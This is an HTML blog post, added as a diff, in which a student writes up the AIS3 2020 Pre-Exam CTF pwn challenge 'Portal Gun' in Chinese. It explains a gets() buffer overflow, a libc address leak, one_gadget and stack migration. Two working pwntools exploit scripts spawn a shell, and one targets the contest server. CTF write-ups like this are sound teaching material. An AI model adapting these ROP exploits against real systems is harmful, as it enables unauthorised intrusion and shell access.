@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.74.3" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><title>AIS3 2020 Pre-Exam CTF pwn Portal Gun writeup&nbsp;&ndash;&nbsp;Shin&#39;s Blog</title><link rel="stylesheet" href="/css/core.min.56852e5dcac5d77dc592e9044e37cf8a2f4c0ecdb70121069de9cdf63290499e3eec4da4a5269dcc777d4703484701cd.css" integrity="sha384-VoUuXcrF133FkukETjfPii9MDs23ASEGnenN9jKQSZ4&#43;7E2kpSadzHd9RwNIRwHN"><body>
+    <div class="base-body"><section id="header" class="site header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><span class="site name">Shin's Blog</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/categories/">Categories</a><a class="nav item" href="/tags/">Tags</a><a class="nav item" href="/content/about.html">About</a><a class="nav item" href="https://gohugo.io/"target="_blank">Hugo</a></nav></div></span></div><div class="site slogan"><span class="title">Listening Music and Learning CS</span></div></section><div id="content"><section class="article header">
+    <h1 class="article title">AIS3 2020 Pre-Exam CTF pwn Portal Gun writeup</h1><p class="article date">Saturday, June 20, 2020</p></section><article class="article markdown-body"><h1 id="ais3-2020-pre-exam-ctf-portal-gun-writeup">AIS3 2020 Pre-Exam CTF Portal Gun Writeup</h1>
+<p>Author: Sophie Shin <br>
+Time: 2020/06/10 10:00 A.M. <br>
+為了配合AIS3要抽選手繳交 wirteup，就延後發文了</p>
+<h2 id="前言">前言</h2>
+<p>2019 第一次參加 MyFirstCTF 之後有幸錄取 AIS3 課程，便開始入坑 pwn <br>
+在那之前完全沒碰過組合語言，計算機組織也直到今年(大三）才修，<br>
+入坑一開始極其痛苦，發現很多觀念還沒學得很扎實，便開始看原文書《Computer Systems. A Programmer’s Perspective》，並且參與台灣好厲駭計畫，聆聽線上課程資源。　<br></p>
+<p>去年只解出 BOF，今年的 pwn 很幸運的解出了 3 題，也靠 pwn 才足以進 Pre-Exam 前一百名，但還是有待加強！ <br>
+Portal Gun 應該是我至今解過算是很有挑戰的題目 (等級還不足XD)，就認真寫了 Writeup <br></p>
+<h2 id="使用的分析工具">使用的分析工具</h2>
+<ul>
+<li>GDB-peda</li>
+<li>objdump</li>
+<li>readelf</li>
+<li>ROPgadget</li>
+<li>onegadget</li>
+<li>r2</li>
+</ul>
+<h2 id="流程">流程</h2>
+<ol>
+<li>
+<p>使用 <code>file</code> 指令觀察： <br></p>
+<ul>
+<li>此檔案的使用何種 ISA ，x86 還是 x86-64 ?</li>
+<li>是否是 dynamic linking?
+<a target="_blank" rel="noopener noreferrer" 
+  href="https://i.imgur.com/GFuMQix.png"><img  src="https://i.imgur.com/GFuMQix.png"
+        alt/></a></li>
+</ul>
+</li>
+<li>
+<p>接著使用 <code>checksec</code> 指令 (GDB-peda 有內建也可以使用) <br></p>
+</li>
+</ol>
+<p><a target="_blank" rel="noopener noreferrer" 
+  href="https://i.imgur.com/ZYovs2c.png"><img  src="https://i.imgur.com/ZYovs2c.png"
+        alt/></a></p>
+<p>發現檔案並沒有開啟 <em>Canary</em> 保護</p>
+<ol start="3">
+<li>使用 r2 工具來觀察程式的行為 <br>
+可以看到，程式會做 <code>gets var_70h</code> ，而 <code>var_70h</code> 儲存在 <code>rbp-0x70</code> ，因此可以朝 BOF 的方向下手
+<a target="_blank" rel="noopener noreferrer" 
+  href="https://i.imgur.com/A3o0LvH.png"><img  src="https://i.imgur.com/A3o0LvH.png"
+        alt/></a></li>
+</ol>
+<p>此題透過 <code>objdump</code> 或 <code>r2</code> 觀察後發現，裡面有 import <code>system()</code> 函式，因此可先以 Buffer overflow 的手法來 hook <code>system()</code></p>
+<p><a target="_blank" rel="noopener noreferrer" 
+  href="https://i.imgur.com/VpQr8yq.png"><img  src="https://i.imgur.com/VpQr8yq.png"
+        alt/></a></p>
+<ul>
+<li>使用 <code>objdump -d -M intel ./portal_gun | less</code> 來觀察整個程式行為 <br>
+objdump 工具的方便在於，可直接觀察整個程式的流程，並且可透過搜尋或 <code>grep</code> 的方式，來直接判斷是否有可用的<strong>進入點</strong>，例如是否有 import <code>system()</code>，或是呼叫 <code>system(&quot;/bin/sh&quot;)</code> 等。</li>
+</ul>
+<p><a target="_blank" rel="noopener noreferrer" 
+  href="https://i.imgur.com/uIYenhP.png"><img  src="https://i.imgur.com/uIYenhP.png"
+        alt/></a></p>
+<p>嘗試寫了腳本，在本地端確實成功地執行 shell !</p>
+<pre><code class="language-python=" data-lang="python=">from pwn import *
+
+offset = 0x70
+call_sys = 0x4006e8
+payload = 'a'*offset + p64(call_sys)
+p = process(&quot;./portal_gun&quot;)
+#p = remote(&quot;60.250.197.227&quot;, 10002)
+p.recvline()
+p.recvline()
+p.sendline(payload)
+p.interactive()
+p.close()
+</code></pre><p><a target="_blank" rel="noopener noreferrer" 
+  href="https://i.imgur.com/pC44vSW.png"><img  src="https://i.imgur.com/pC44vSW.png"
+        alt/></a></p>
+<p>以為這樣就能成功，但是&hellip; Hook Dection! <br></p>
+<p><a target="_blank" rel="noopener noreferrer" 
+  href="https://i.imgur.com/FIbWdTG.png"><img  src="https://i.imgur.com/FIbWdTG.png"
+        alt/></a></p>
+<p>仔細思考，題目除了給 <code>portal gun</code> 檔案，還給了 <code>libc.so.6</code> 和 <code>hook.so</code> <br></p>
+<p>使用 <code>r2</code> 觀察 <code>hook.so</code> 裡 <code>system()</code> 被呼叫的行為，只有單純印出 <code>** system function hook **</code> 就 return 了，也就是說 <strong>此題的 <code>portal_gun</code> 有將 <code>system()</code> 的程式行為竄改過，因為引入了 <code>hook.so</code> 的 <code>system()</code> 來使用</strong> <br></p>
+<p>因此，我們必須使用 <code>libc.so.6</code> 計算出 <em>C library base address</em> 來取得 <em>shell</em>，難度頓時增加許多。 <br></p>
+<ol start="4">
+<li>計算 <em>library base address</em> <br>
+使用 <code>readelf -a libc.so.6 | grep &quot;puts&quot;</code> 來找出 <code>puts()</code> 在 <code>libc.so.6</code> 的 offset</li>
+</ol>
+<p><a target="_blank" rel="noopener noreferrer" 
+  href="https://i.imgur.com/xgZzo3L.png"><img  src="https://i.imgur.com/xgZzo3L.png"
+        alt/></a></p>
+<p>再透過 BOF 的手法來使用 gets 函數，<br>
+使用 <code>ROPgadget --binary portal_gun | grep &quot;pop rdi.*ret$&quot;</code> 找出可用的 gadget <code>pop rdi ; ret</code> 後，便可在 return 到 <code>puts()</code> 前，放入 <code>puts_got</code> 的位址，之後在 return 到 <code>puts()</code> 時，便能 leak 出 puts 在程式實際執行的位址，計算出實際的 <em>library base address</em><br></p>
+<p><a target="_blank" rel="noopener noreferrer" 
+  href="https://i.imgur.com/IaC9Www.png"><img  src="https://i.imgur.com/IaC9Www.png"
+        alt/></a></p>
+<p>計算出 base 位址後，使用 <code>onegadget libc.so.6</code> 找出執行 <code>execve(&quot;/bin/sh&quot;, 0, 0);</code> 的 offset，加上 base 之後，即實際的執行位址 (變動的)</p>
+<ol start="5">
+<li>return gets()，使用 ROP 手法輸入 gadgets <br>
+使用 <code>pop rdi ; ret</code> 這個 gadget，放入 data section 的位址 (要寫入的位址)，在 return 到 <code>gets()</code> 時，就會再次將 payload 輸入到 data section 中 <br></li>
+</ol>
+<p>並使用 <code>leave; ret</code> 的 gadget ，來達到 <em>stack migration</em> 的手法，將 stack pointer 挪到 data section 使用，以便執行一連串的手法來執行 shell</p>
+<p>解法如下：</p>
+<pre><code class="language-python=" data-lang="python=">from pwn import *
+
+puts_got = 0x601018
+libc_puts = 0x0809c0
+one_gadget = 0x4f322
+call_puts = 0x400560
+call_gets = 0x400580
+main = 0x400720
+offset = 0x70 # 0x70+8 to return
+data_sec = 0x601040
+pop_rdi = 0x4007a3 # pop rdi ; ret
+ret = 0x400291 # ret
+pop_rbp = 0x400608 # pop rbp ; ret
+leave = 0x40073b # leave ; ret
+
+#p = process(&quot;./portal_gun&quot;)
+p = remote(&quot;60.250.197.227&quot;, 10002)
+
+p.recvline()
+p.recvline()
+payload = 'a'*offset + p64(data_sec) + p64(pop_rdi) + p64(puts_got) + p64(call_puts) 
+payload += p64(pop_rdi) + p64(data_sec) + p64(call_gets)
+payload += p64(leave) + p64(data_sec) + p64(leave)
+p.sendline(payload)
+
+# leak
+leak_addr = p.recvline()
+puts_run_address = u64(leak_addr[:-1].ljust(8, &quot;\x00&quot;)) # u64
+print(hex(puts_run_address))
+base = puts_run_address - libc_puts
+call_shell = base + one_gadget
+
+# input payload in data section
+payload = p64(call_shell) + p64(ret) + p64(ret) + p64(call_shell)
+p.sendline(payload)
+p.interactive()
+p.close()
+</code></pre></article><section class="article labels"><a class="category" href=/categories/writeup/>writeup</a><a class="tag" href=/tags/ctf/>CTF</a><a class="tag" href=/tags/pwn/>pwn</a></section><section class="article navigation"><p><a class="link" href="/posts/2020/07/asisctf2020_full_protection_writeup/"><span class="li">&larr;</span>ASIS CTF 2020 pwn Full Protection Writeup</a></p><p><a class="link" href="/posts/2020/05/migration/"><span class="li">&rarr;</span>Stack Migration</a class="link">
+    </p></section></div><section id="footer" class="footer"><div class="footer-wrap">
+    <p class="copyright">©2020 Notepadium.</p>
+    <p class="powerby"><span>Powered by </span><a href="https://gohugo.io" 
+        target="_blank">Hugo</a><span> and the </span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank">Notepadium</a></p>
+</div></section><script src="/js/hljs.min.0799348a91dce12c6be4a73f943cfe78f181f4e6f6ec35c4af0fca1de377879f77cfab03c30f03a174d675737b5a9314.js" integrity="sha384-B5k0ipHc4Sxr5Kc/lDz&#43;ePGB9Ob27DXErw/KHeN3h593z6sDww8DoXTWdXN7WpMU"></script><script>hljs.initHighlightingOnLoad();</script></div>
+</body>
+
+</html>
